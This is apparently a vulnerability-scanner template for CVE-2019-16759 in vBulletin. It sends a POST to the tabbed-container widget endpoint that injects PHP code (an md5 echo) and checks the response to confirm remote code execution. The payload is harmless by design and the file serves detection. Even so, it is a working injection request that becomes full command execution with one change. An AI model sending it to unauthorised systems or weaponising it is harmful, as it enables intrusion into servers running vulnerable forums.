id: CVE-2019-16759

info:
  name: vBulletin v5.0.0-v5.5.4 Remote Command Execution
  author: Loneyer
  severity: critical
  verified: false
  description: |
    vBulletin v5.0.0-v5.5.4 is vulnerable to remote command execution via the /ajax/render/widget_tabbedcontainer_tab_panel endpoint.
  reference:
    - https://www.exploit-db.com/exploits/48003
    - https://nvd.nist.gov/vuln/detail/CVE-2019-16759
  tags: cve,cve2019,rce,vbulletin
  created: 2023/08/10

set:
  f1: randomInt(800000000, 900000000)
rules:
  r0:
    request:
      method: POST
      path: /ajax/render/widget_tabbedcontainer_tab_panel
      body: subWidgets[0][template]=widget_php&subWidgets[0][config][code]=var_dump(md5({{f1}}));
    expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(f1)), 0, 31)))
expression: r0()
